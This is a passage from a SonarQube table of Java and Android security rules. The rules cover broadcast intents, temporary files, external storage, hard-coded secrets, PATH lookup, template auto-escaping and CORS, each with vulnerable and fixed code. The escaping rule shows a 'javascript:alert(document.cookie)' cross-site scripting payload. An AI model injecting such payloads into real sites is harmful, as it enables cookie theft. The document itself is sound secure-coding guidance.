never be the only defense mechanism and should always be combined with other security measures.</p>
<h2>Sensitive Code Example</h2>
<pre>
@GetMapping(value = "/example")
public ResponseEntity&lt;String&gt; example() {
  HttpHeaders responseHeaders = new HttpHeaders();
  responseHeaders.set("x-powered-by", "myproduct"); // Sensitive

  return new ResponseEntity&lt;String&gt;(
      "example",
      responseHeaders,
      HttpStatus.CREATED);
}
</pre>
<h2>Compliant Solution</h2>
<p>Do not disclose version information unless necessary. The <code>x-powered-by</code> or <code>Server</code> HTTP headers should not be used.</p>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> <a
  href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.html">OWASP Testing Guide - OTG-INFO-008</a> - Fingerprint Web Application Framework </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/200">CWE-200 - Information Exposure</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5322">
              java:S5322
            </a>
          </td>
          <td>
            <details>
              <p>Android applications can receive broadcasts from the system or other applications. Receiving intents is security-sensitive. For example, it has led
in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1677">CVE-2019-1677</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1275">CVE-2015-1275</a> </li>
</ul>
<p>Receivers can be declared in the manifest or in the code to make them context-specific. If the receiver is declared in the manifest Android will
start the application if it is not already running once a matching broadcast is received. The receiver is an entry point into the application.</p>
<p>Other applications can send potentially malicious broadcasts, so it is important to consider broadcasts as untrusted and to limit the applications
that can send broadcasts to the receiver.</p>
<p>Permissions can be specified to restrict broadcasts to authorized applications. Restrictions can be enforced by both the sender and receiver of a
broadcast. If permissions are specified when registering a broadcast receiver, then only broadcasters who were granted this permission can send a
message to the receiver.</p>
<p>This rule raises an issue when a receiver is registered without specifying any broadcast permission.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The data extracted from intents is not sanitized. </li>
  <li> Intents broadcast is not restricted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Restrict the access to broadcasted intents. See the <a
href="https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions">Android documentation</a> for more
information.</p>
<h2>Sensitive Code Example</h2>
<pre>
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Handler;
import android.support.annotation.RequiresApi;

public class MyIntentReceiver {

    @RequiresApi(api = Build.VERSION_CODES.O)
    public void register(Context context, BroadcastReceiver receiver,
                         IntentFilter filter,
                         String broadcastPermission,
                         Handler scheduler,
                         int flags) {
        context.registerReceiver(receiver, filter); // Sensitive
        context.registerReceiver(receiver, filter, flags); // Sensitive

        // Broadcasting intent with "null" for broadcastPermission
        context.registerReceiver(receiver, filter, null, scheduler); // Sensitive
        context.registerReceiver(receiver, filter, null, scheduler, flags); // Sensitive
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Handler;
import android.support.annotation.RequiresApi;

public class MyIntentReceiver {

    @RequiresApi(api = Build.VERSION_CODES.O)
    public void register(Context context, BroadcastReceiver receiver,
                         IntentFilter filter,
                         String broadcastPermission,
                         Handler scheduler,
                         int flags) {

        context.registerReceiver(receiver, filter, broadcastPermission, scheduler);
        context.registerReceiver(receiver, filter, broadcastPermission, scheduler, flags);
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment">Mobile AppSec
  Verification Standard - Platform Interaction Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage">Mobile Top 10 2016 Category M1 - Improper
  Platform Usage</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/925">CWE-925 - Improper Verification of Intent by Broadcast Receiver</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/926">CWE-926 - Improper Export of Android Application Components</a> </li>
  <li> <a href="https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions">Android documentation</a> -
  Broadcast Overview - Security considerations and best practices </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5443">
              java:S5443
            </a>
          </td>
          <td>
            <details>
              <p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like
<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious
user can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,
modified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2451">CVE-2012-2451</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-1838">CVE-2015-1838</a> </li>
</ul>
<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It
also detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code> and <code>TMPDIR</code>.</p>
<ul>
  <li> <code>/tmp</code> </li>
  <li> <code>/var/tmp</code> </li>
  <li> <code>/usr/tmp</code> </li>
  <li> <code>/dev/shm</code> </li>
  <li> <code>/dev/mqueue</code> </li>
  <li> <code>/run/lock</code> </li>
  <li> <code>/var/run/lock</code> </li>
  <li> <code>/Library/Caches</code> </li>
  <li> <code>/Users/Shared</code> </li>
  <li> <code>/private/tmp</code> </li>
  <li> <code>/private/var/tmp</code> </li>
  <li> <code>\Windows\Temp</code> </li>
  <li> <code>\Temp</code> </li>
  <li> <code>\TMP</code> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Files are read from or written into a publicly writable folder </li>
  <li> The application creates files with predictable names into a publicly writable folder </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use a dedicated sub-folder with tightly controlled permissions </li>
  <li> Use secure-by-design APIs to create temporary files. Such API will make sure:
    <ul>
      <li> The generated filename is unpredictable </li>
      <li> The file is readable and writable only by the creating user ID </li>
      <li> The file descriptor is not inherited by child processes </li>
      <li> The file will be destroyed as soon as it is closed </li>
    </ul>  </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
new File("/tmp/myfile.txt"); // Sensitive
Paths.get("/tmp/myfile.txt"); // Sensitive

java.io.File.createTempFile("prefix", "suffix"); // Sensitive, will be in the default temporary-file directory.
java.nio.file.Files.createTempDirectory("prefix"); // Sensitive, will be in the default temporary-file directory.
</pre>
<pre>
Map&lt;String, String&gt; env = System.getenv();
env.get("TMP"); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
new File("/myDirectory/myfile.txt");  // Compliant

File.createTempFile("prefix", "suffix", new File("/mySecureDirectory"));  // Compliant

if(SystemUtils.IS_OS_UNIX) {
  FileAttribute&lt;Set&lt;PosixFilePermission&gt;&gt; attr = PosixFilePermissions.asFileAttribute(PosixFilePermissions.fromString("rwx------"));
  Files.createTempFile("prefix", "suffix", attr); // Compliant
}
else {
  File f = Files.createTempFile("prefix", "suffix").toFile();  // Compliant
  f.setReadable(true, true);
  f.setWritable(true, true);
  f.setExecutable(true, true);
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/377">CWE-377 - Insecure Temporary File</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/379">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>
  </li>
  <li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File">OWASP, Insecure Temporary File</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5445">
              java:S5445
            </a>
          </td>
          <td>
            <details>
              <p>Temporary files are considered insecurely created when the file existence check is performed separately from the actual file creation. Such a
situation can occur when creating temporary files using normal file handling functions or when using dedicated temporary file handling functions that
are not atomic.</p>
<h2>Why is this an issue?</h2>
<p>Creating temporary files in a non-atomic way introduces race condition issues in the application’s behavior. Indeed, a third party can create a
given file between when the application chooses its name and when it creates it.</p>
<p>In such a situation, the application might use a temporary file that it does not entirely control. In particular, this file’s permissions might be
different than expected. This can lead to trust boundary issues.</p>
<h3>What is the potential impact?</h3>
<p>Attackers with control over a temporary file used by a vulnerable application will be able to modify it in a way that will affect the application’s
logic. By changing this file’s Access Control List or other operating system-level properties, they could prevent the file from being deleted or
emptied. They may also alter the file’s content before or while the application uses it.</p>
<p>Depending on why and how the affected temporary files are used, the exploitation of a race condition in an application can have various
consequences. They can range from sensitive information disclosure to more serious application or hosting infrastructure compromise.</p>
<h4>Information disclosure</h4>
<p>Because attackers can control the permissions set on temporary files and prevent their removal, they can read what the application stores in them.
This might be especially critical if this information is sensitive.</p>
<p>For example, an application might use temporary files to store users' session-related information. In such a case, attackers controlling those
files can access session-stored information. This might allow them to take over authenticated users' identities and entitlements.</p>
<h4>Attack surface extension</h4>
<p>An application might use temporary files to store technical data for further reuse or as a communication channel between multiple components. In
that case, it might consider those files part of the trust boundaries and use their content without additional security validation or sanitation. In
such a case, an attacker controlling the file content might use it as an attack vector for further compromise.</p>
<p>For example, an application might store serialized data in temporary files for later use. In such a case, attackers controlling those files'
content can change it in a way that will lead to an insecure deserialization exploitation. It might allow them to execute arbitrary code on the
application hosting server and take it over.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<p>The following code example is vulnerable to a race condition attack because it creates a temporary file using an unsafe API function.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import java.io.File;
import java.io.IOException;

protected void Example() throws IOException {
    File tempDir;
    tempDir = File.createTempFile("", ".");
    tempDir.delete();
    tempDir.mkdir();  // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;

protected void Example() throws IOException {
    Path tempPath = Files.createTempDirectory("");
    File tempDir = tempPath.toFile();
}
</pre>
<h3>How does this work?</h3>
<p>Applications should create temporary files so that no third party can read or modify their content. It requires that the files' name, location, and
permissions are carefully chosen and set. This can be achieved in multiple ways depending on the applications' technology stacks.</p>
<h4>Use a secure API function</h4>
<p>Temporary files handling APIs generally provide secure functions to create temporary files. In most cases, they operate in an atomical way,
creating and opening a file with a unique and unpredictable name in a single call. Those functions can often be used to replace less secure
alternatives without requiring important development efforts.</p>
<p>Here, the example compliant code uses the safer <code>Files.createTempDirectory</code> function to manage the creation of temporary
directories.</p>
<h4>Strong security controls</h4>
<p>Temporary files can be created using unsafe functions and API as long as strong security controls are applied. Non-temporary file-handling
functions and APIs can also be used for that purpose.</p>
<p>In general, applications should ensure that attackers can not create a file before them. This turns into the following requirements when creating
the files:</p>
<ul>
  <li> Files should be created in a non-public directory. </li>
  <li> File names should be unique. </li>
  <li> File names should be unpredictable. They should be generated using a cryptographically secure random generator. </li>
  <li> File creation should fail if a target file already exists. </li>
</ul>
<p>Moreover, when possible, it is recommended that applications destroy temporary files after they have finished using them.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File">OWASP</a> - Insecure Temporary File </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/377">CWE-377 - Insecure Temporary File</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/379">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>
  </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5324">
              java:S5324
            </a>
          </td>
          <td>
            <details>
              <p>Storing data locally is a common task for mobile applications. Such data includes files among other things. One convenient way to store files is to
use the external file storage which usually offers a larger amount of disc space compared to internal storage.</p>
<p>Files created on the external storage are globally readable and writable. Therefore, a malicious application having the permissions
<code>WRITE_EXTERNAL_STORAGE</code> or <code>READ_EXTERNAL_STORAGE</code> could try to read sensitive information from the files that other
applications have stored on the external storage.</p>
<p>External storage can also be removed by the user (e.g when based on SD card) making the files unavailable to the application.</p>
<h2>Ask Yourself Whether</h2>
<p>Your application uses external storage to:</p>
<ul>
  <li> store files that contain sensitive data. </li>
  <li> store files that are not meant to be shared with other application. </li>
  <li> store files that are critical for the application to work. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use internal storage whenever possible as the system prevents other apps from accessing this location. </li>
  <li> Only use external storage if you need to share non-sensitive files with other applications. </li>
  <li> If your application has to use the external storage to store sensitive data, make sure it encrypts the files using <a
  href="https://developer.android.com/reference/androidx/security/crypto/EncryptedFile">EncryptedFile</a>. </li>
  <li> Data coming from external storage should always be considered untrusted and should be validated. </li>
  <li> As some external storage can be removed, make sure to never store files on it that are critical for the usability of your application. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
import android.content.Context;

public class AccessExternalFiles {

    public void accessFiles(Context context) {
        context.getExternalFilesDir(null); // Sensitive
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import android.content.Context;

public class AccessExternalFiles {

    public void accessFiles(Context context) {
        context.getFilesDir();
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> <a href="https://developer.android.com/privacy-and-security/security-tips#ExternalStorage">Android Security tips on external file storage</a>
  </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements">Mobile AppSec
  Verification Standard - Data Storage and Privacy Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage">Mobile Top 10 2016 Category M2 - Insecure
  Data Storage</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/312">CWE-312 - Cleartext Storage of Sensitive Information</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6418">
              java:S6418
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, secrets should not be hard-coded. This is particularly true for
applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25510">CVE-2022-25510</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42635">CVE-2021-42635</a> </li>
</ul>
<p>Secrets should be stored outside of the source code in a configuration file or a management service for secrets.</p>
<p>This rule detects variables/fields having a name matching a list of words (secret, token, credential, auth, api[_.-]?key) being assigned a
pseudorandom hard-coded value. The pseudorandomness of the hard-coded value is based on its entropy and the probability to be human-readable. The
randomness sensibility can be adjusted if needed. Lower values will detect less random values, raising potentially more false positives.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The secret allows access to a sensitive component like a database, a file storage, an API, or a service. </li>
  <li> The secret is used in a production environment. </li>
  <li> Application re-distribution is required before updating the secret. </li>
</ul>
<p>There would be a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Store the secret in a configuration file that is not pushed to the code repository. </li>
  <li> Use your cloud provider’s service for managing secrets. </li>
  <li> If a secret has been disclosed through the source code: revoke it and create a new one. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
private static final String MY_SECRET = "47828a8dd77ee1eb9dde2d5e93cb221ce8c32b37";

public static void main(String[] args) {
  MyClass.callMyService(MY_SECRET);
}
</pre>
<h2>Compliant Solution</h2>
<p>Using <a href="https://github.com/awsdocs/aws-doc-sdk-examples/tree/main/javav2/example_code/secretsmanager">AWS Secrets Manager</a>:</p>
<pre>
import software.amazon.awssdk.services.secretsmanager.model.GetSecretValueRequest;
import software.amazon.awssdk.services.secretsmanager.model.GetSecretValueResponse;

public static void main(String[] args) {
  SecretsManagerClient secretsClient = ...
  MyClass.doSomething(secretsClient, "MY_SERVICE_SECRET");
}

public static void doSomething(SecretsManagerClient secretsClient, String secretName) {
  GetSecretValueRequest valueRequest = GetSecretValueRequest.builder()
    .secretId(secretName)
    .build();

  GetSecretValueResponse valueResponse = secretsClient.getSecretValue(valueRequest);
  String secret = valueResponse.secretString();
  // do something with the secret
  MyClass.callMyService(secret);
}
</pre>
<p>Using <a href="https://docs.microsoft.com/en-us/azure/key-vault/secrets/quick-create-java?tabs=azure-cli">Azure Key Vault Secret</a>:</p>
<pre>
import com.azure.identity.DefaultAzureCredentialBuilder;

import com.azure.security.keyvault.secrets.SecretClient;
import com.azure.security.keyvault.secrets.SecretClientBuilder;
import com.azure.security.keyvault.secrets.models.KeyVaultSecret;

public static void main(String[] args) throws InterruptedException, IllegalArgumentException {
  String keyVaultName = System.getenv("KEY_VAULT_NAME");
  String keyVaultUri = "https://" + keyVaultName + ".vault.azure.net";

  SecretClient secretClient = new SecretClientBuilder()
    .vaultUrl(keyVaultUri)
    .credential(new DefaultAzureCredentialBuilder().build())
    .buildClient();

  MyClass.doSomething(secretClient, "MY_SERVICE_SECRET");
}

public static void doSomething(SecretClient secretClient, String secretName) {
  KeyVaultSecret retrievedSecret = secretClient.getSecret(secretName);
  String secret = retrievedSecret.getValue(),

  // do something with the secret
  MyClass.callMyService(secret);
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/OjdGBQ">CERT, MSC03-J.</a> - Never hard code sensitive information </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5320">
              java:S5320
            </a>
          </td>
          <td>
            <details>
              <p>In Android applications, broadcasting intents is security-sensitive. For example, it has led in the past to the following vulnerability:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9489">CVE-2018-9489</a> </li>
</ul>
<p>By default, broadcasted intents are visible to every application, exposing all sensitive information they contain.</p>
<p>This rule raises an issue when an intent is broadcasted without specifying any "receiver permission".</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The intent contains sensitive information. </li>
  <li> Intent reception is not restricted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Restrict the access to broadcasted intents. See <a
href="https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions">Android documentation</a> for more
information.</p>
<h2>Sensitive Code Example</h2>
<pre>
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.UserHandle;
import android.support.annotation.RequiresApi;

public class MyIntentBroadcast {
    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR1)
    public void broadcast(Intent intent, Context context, UserHandle user,
                          BroadcastReceiver resultReceiver, Handler scheduler, int initialCode,
                          String initialData, Bundle initialExtras,
                          String broadcastPermission) {
        context.sendBroadcast(intent); // Sensitive
        context.sendBroadcastAsUser(intent, user); // Sensitive

        // Broadcasting intent with "null" for receiverPermission
        context.sendBroadcast(intent, null); // Sensitive
        context.sendBroadcastAsUser(intent, user, null); // Sensitive
        context.sendOrderedBroadcast(intent, null); // Sensitive
        context.sendOrderedBroadcastAsUser(intent, user, null, resultReceiver,
                scheduler, initialCode, initialData, initialExtras); // Sensitive
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.UserHandle;
import android.support.annotation.RequiresApi;

public class MyIntentBroadcast {
    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR1)
    public void broadcast(Intent intent, Context context, UserHandle user,
                          BroadcastReceiver resultReceiver, Handler scheduler, int initialCode,
                          String initialData, Bundle initialExtras,
                          String broadcastPermission) {

        context.sendBroadcast(intent, broadcastPermission);
        context.sendBroadcastAsUser(intent, user, broadcastPermission);
        context.sendOrderedBroadcast(intent, broadcastPermission);
        context.sendOrderedBroadcastAsUser(intent, user,broadcastPermission, resultReceiver,
                scheduler, initialCode, initialData, initialExtras);
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment">Mobile AppSec
  Verification Standard - Platform Interaction Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage">Mobile Top 10 2016 Category M1 - Improper
  Platform Usage</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/927">CWE-927 - Use of Implicit Intent for Sensitive Communication</a> </li>
  <li> <a href="https://developer.android.com/guide/components/broadcasts.html#restricting_broadcasts_with_permissions">Android documentation</a> -
  Broadcast Overview - Security considerations and best practices </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4036">
              java:S4036
            </a>
          </td>
          <td>
            <details>
              <p>When executing an OS command and unless you specify the full path to the executable, then the locations in your application’s <code>PATH</code>
environment variable will be searched for the executable. That search could leave an opening for an attacker if one of the elements in
<code>PATH</code> is a directory under his control.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The directories in the PATH environment variable may be defined by not trusted entities. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Fully qualified/absolute path should be used to specify the OS command to execute.</p>
<h2>Sensitive Code Example</h2>
<p>The full path of the command is not specified and thus the executable will be searched in all directories listed in the <code>PATH</code>
environment variable:</p>
<pre>
Runtime.getRuntime().exec("make");  // Sensitive
Runtime.getRuntime().exec(new String[]{"make"});  // Sensitive

ProcessBuilder builder = new ProcessBuilder("make");  // Sensitive
builder.command("make");  // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>The command is defined by its full path:</p>
<pre>
Runtime.getRuntime().exec("/usr/bin/make");  // Compliant
Runtime.getRuntime().exec(new String[]{"~/bin/make"});  // Compliant

ProcessBuilder builder = new ProcessBuilder("./bin/make");  // Compliant
builder.command("../bin/make");  // Compliant
builder.command(Arrays.asList("..\bin\make", "-j8")); // Compliant

builder = new ProcessBuilder(Arrays.asList(".\make"));  // Compliant
builder.command(Arrays.asList("C:\bin\make", "-j8"));  // Compliant
builder.command(Arrays.asList("\\SERVER\bin\make"));  // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">Top 10 2021 Category A8 - Software and Data Integrity
  Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/426">CWE-426 - Untrusted Search Path</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/427">CWE-427 - Uncontrolled Search Path Element</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5247">
              java:S5247
            </a>
          </td>
          <td>
            <details>
              <p>To reduce the risk of cross-site scripting attacks, templating systems, such as <code>Twig</code>, <code>Django</code>, <code>Smarty</code>,
<code>Groovy's template engine</code>, allow configuration of automatic variable escaping before rendering templates. When escape occurs, characters
that make sense to the browser (eg: &lt;a&gt;) will be transformed/replaced with escaped/sanitized values (eg: &amp; lt;a&amp; gt; ).</p>
<p>Auto-escaping is not a magic feature to annihilate all cross-site scripting attacks, it depends on <a
href="https://twig.symfony.com/doc/3.x/filters/escape.html">the strategy applied</a> and the context, for example a "html auto-escaping" strategy
(which only transforms html characters into <a href="https://developer.mozilla.org/en-US/docs/Glossary/Entity">html entities</a>) will not be relevant
when variables are used in a <a href="https://en.wikipedia.org/wiki/HTML_attribute">html attribute</a> because '<code>:</code>' character is not
escaped and thus an attack as below is possible:</p>
<pre>
&lt;a href="{{ myLink }}"&gt;link&lt;/a&gt; // myLink = javascript:alert(document.cookie)
&lt;a href="javascript:alert(document.cookie)"&gt;link&lt;/a&gt; // JS injection (XSS attack)
</pre>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Templates are used to render web content and
    <ul>
      <li> dynamic variables in templates come from untrusted locations or are user-controlled inputs </li>
      <li> there is no local mechanism in place to sanitize or validate the inputs. </li>
    </ul>  </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable auto-escaping by default and continue to review the use of inputs in order to be sure that the chosen auto-escaping strategy is the right
one.</p>
<h2>Sensitive Code Example</h2>
<p>With <a href="https://github.com/samskivert/jmustache">JMustache by samskivert</a>:</p>
<pre>
Mustache.compiler().escapeHTML(false).compile(template).execute(context); // Sensitive
Mustache.compiler().withEscaper(Escapers.NONE).compile(template).execute(context); // Sensitive
</pre>
<p>With <a href="https://freemarker.apache.org/">Freemarker</a>:</p>
<pre>
freemarker.template.Configuration configuration = new freemarker.template.Configuration();
configuration.setAutoEscapingPolicy(DISABLE_AUTO_ESCAPING_POLICY); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>With <a href="https://github.com/samskivert/jmustache">JMustache by samskivert</a>:</p>
<pre>
Mustache.compiler().compile(template).execute(context); // Compliant, auto-escaping is enabled by default
Mustache.compiler().escapeHTML(true).compile(template).execute(context); // Compliant
</pre>
<p>With <a href="https://freemarker.apache.org/">Freemarker</a>. See <a
href="https://freemarker.apache.org/docs/api/freemarker/template/Configuration.html#setAutoEscapingPolicy-int-">"setAutoEscapingPolicy"
documentation</a> for more details.</p>
<pre>
freemarker.template.Configuration configuration = new freemarker.template.Configuration();
configuration.setAutoEscapingPolicy(ENABLE_IF_DEFAULT_AUTO_ESCAPING_POLICY); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md">OWASP Cheat
  Sheet</a> - XSS Prevention Cheat Sheet </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site
  Scripting')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5122">
              java:S5122
            </a>
          </td>
          <td>
            <details>
              <p>Having a permissive Cross-Origin Resource Sharing policy is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0269">CVE-2018-0269</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14460">CVE-2017-14460</a> </li>
</ul>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">Same origin policy</a> in browsers prevents, by default and for
